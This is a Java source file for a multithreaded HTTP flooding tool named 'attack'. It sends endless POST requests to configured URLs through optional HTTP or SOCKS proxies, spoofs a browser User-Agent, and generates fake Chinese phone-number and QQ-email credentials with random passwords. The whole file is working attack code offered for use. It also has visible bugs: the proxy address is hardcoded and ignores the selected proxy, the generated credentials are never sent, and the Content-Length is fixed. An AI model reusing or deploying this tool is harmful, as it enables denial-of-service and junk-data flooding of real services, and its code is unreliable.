
//import java.io.BufferedReader;
//import java.io.InputStreamReader;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;

import java.util.Random;

public class attack implements Runnable {
    static String method = file.method;
    static String[] urls = file.urls;
    static String param = file.param;
    static boolean genoutput = file.genoutput;
    static boolean proxyswitch = file.proxyswitch;
    static String[] proxyhttp;
    static String[] proxysocks;
    static boolean proxyhttpswich = false;
    static boolean proxysocksswich = false;
    
    protected static void start() {
        if (proxyswitch) {
            proxyhttp = murl.readhttp(file.proxyfile);
            if (proxyhttp != null) {
                proxyhttpswich = true;
            }
            proxysocks = murl.readsocks(file.proxyfile);
            if (proxysocks != null) {
                proxysocksswich = true;
            }
        }
        for (int i = 0; i < file.thnum; i++) {
            new Thread(new attack()).start();
        }
    }

    public void run() {
        Random random = new Random();
        int max = 16;
        int min = 8;

        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*";
        String[] bfnum = {
                "134", "135", "136", "137", "138", "139", "150", "151", "152", "157", "158", "159", "182", "183", "184", // 中国移动
                "187", "188", "178", "147", "172", "198", // 中国移动
                "130", "131", "132", "145", "155", "156", "166", "171", "175", "176", "185", "186", "166", // 中国联通
                "133", "149", "153", "173", "177", "180", "181", "189", "199"// 中国电信
        };
        // proxy
        String proxytype = "";
        String proxyurl = "";
        String[] proxyiurl = { "", "" };
        String proxyhost = "";
        int proxyport = 0;
        if (proxyswitch) {
            if (proxyhttpswich && proxysocksswich) {
                if (random.nextBoolean()) {
                    proxytype = "http";
                    proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
                    proxyiurl = murl.iurl(proxyurl);
                    proxyhost = proxyiurl[0];
                    proxyport = Integer.valueOf(proxyiurl[1]);
                } else {
                    proxytype = "socks";
                    proxyurl = proxysocks[random.nextInt(proxysocks.length)];
                    proxyiurl = murl.iurl(proxyurl);
                    proxyhost = proxyiurl[0];
                    proxyport = Integer.valueOf(proxyiurl[1]);
                }
            } else if (proxyhttpswich && !proxysocksswich) {
                proxytype = "http";
                proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
                proxyiurl = murl.iurl(proxyurl);
                proxyhost = proxyiurl[0];
                proxyport = Integer.valueOf(proxyiurl[1]);
            } else if (!proxyhttpswich && proxysocksswich) {
                proxytype = "socks";
                proxyurl = proxysocks[random.nextInt(proxysocks.length)];
                proxyiurl = murl.iurl(proxyurl);
                proxyhost = proxyiurl[0];
                proxyport = Integer.valueOf(proxyiurl[1]);
            } else {
                System.out.println("ERROR: 没有找到可使用的代理");
            }
        }
        while (true) {
            // url
            String url = urls[random.nextInt(urls.length - 1)].toString();
            // name
            String rn;
            Long brn = (long) (Math.random() * (99999999999l - 10000000)) + 1000000;
            switch (random.nextInt(2) + 1) {
                case 1:
                    int length = random.nextInt(99999999 - 10000000) + 10000000;
                    rn = bfnum[random.nextInt(bfnum.length)].toString() + length;
                    break;
                case 2:
                    rn = brn.toString() + "@qq.com";
                    break;
                case 3:
                default:
                    rn = brn.toString();
                    break;
            }
            // rp
            int rp = random.nextInt(max - min) + min;
            StringBuffer pass = new StringBuffer();
            for (int i = 0; i < rp; i++) {
                int randomInt = random.nextInt(str.length());
                pass.append(str.charAt(randomInt));
            }
            // 输出
            if (genoutput) {
                System.out.println(rn.toString() + " " + pass.toString());
            }
            go(rn.toString(), pass.toString(), url, proxytype, proxyhost, proxyport);
        }
    }

    private static void go(String name, String pass, String surl, String proxytype, String proxyurl, int proxyport) {
        HttpURLConnection httpURLConnection = null;
        try {
            URL url = new URL(surl);
            if (proxytype == "" && proxyurl == "") {
                httpURLConnection = (HttpURLConnection) url.openConnection();
            } else {
                if (proxytype == "http") {
                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("123.0.0.1", 8080));
                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
                } else if (proxytype == "socks") {
                    Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("123.0.0.1", 8080));
                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
                }
            }
            httpURLConnection.setRequestMethod(method);
            // 超时时间
            httpURLConnection.setConnectTimeout(3000);
            // 设置是否输出
            httpURLConnection.setDoOutput(true);
            // 设置是否读入
            httpURLConnection.setDoInput(true);
            // 设置是否使用缓存
            httpURLConnection.setUseCaches(false);
            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
            httpURLConnection.setInstanceFollowRedirects(false);
            // 设置请求头
            httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
            httpURLConnection.setRequestProperty("Content-Length", "40");
            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setRequestProperty("User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46");
            // 连接
            httpURLConnection.connect();
            /* 4. 处理输入输出 */
            // 写入参数到请求中
            String params = param;
            OutputStream out = httpURLConnection.getOutputStream();
            out.write(params.getBytes());
            // 简化
            // httpURLConnection.getOutputStream().write(params.getBytes());
            out.flush();
            out.close();
            // 从连接中读取响应信息
            // String msg = "";
            // int code = httpURLConnection.getResponseCode();
            // if (code == 200) {
            // BufferedReader reader = new BufferedReader(
            // new InputStreamReader(httpURLConnection.getInputStream()));
            // String line;
            // while ((line = reader.readLine()) != null) {
            // msg += line + "\n";
            // }
            // reader.close();
            // }
            // 处理结果
            // System.out.println(msg);
        } catch (IOException e) {
            System.out.println(surl + " 转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
        } finally {
            // 5. 断开连接
            if (null != httpURLConnection) {
                try {
                    httpURLConnection.disconnect();
                } catch (Exception e) {
                    System.out.println(surl + " httpURLConnection 流关闭异常：" + e.getLocalizedMessage());
                }
            }
        }
    }
}